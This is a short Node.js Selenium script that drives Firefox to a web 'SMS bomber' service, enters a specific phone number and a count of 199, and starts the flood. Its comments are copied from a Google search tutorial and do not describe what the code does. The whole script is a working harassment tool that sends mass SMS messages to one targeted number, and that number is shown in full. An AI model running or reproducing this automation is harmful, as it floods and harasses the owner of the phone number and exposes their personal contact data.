const {By,Key,Builder} = require("selenium-webdriver");
const { Executor } = require("selenium-webdriver/http");
require("geckodriver");
 
async function example(){
 
       
 
       //To wait for browser to build and launch properly
       let driver = await new Builder().forBrowser("firefox").build();
 
        //To fetch http://google.com from the browser with our code.
        await driver.get("https://mytoolstown.com/smsbomber");
            
        //To send a search query by passing the value in searchString.
         await driver.findElement(By.id("mobno")).sendKeys("8872213990");
         await driver.findElement(By.id("count")).sendKeys("199");
        
         await driver.findElement(By.id('startsms')).sendKeys(Key.RETURN);


 
        //Verify the page title and print it
        var title = await driver.getTitle();
        console.log('Title is:',title);
 
        //It is always a safe practice to quit the browser after execution
        setTimeout(function () {
         driver.quit();
        }, 200000);

 
}
 
example()
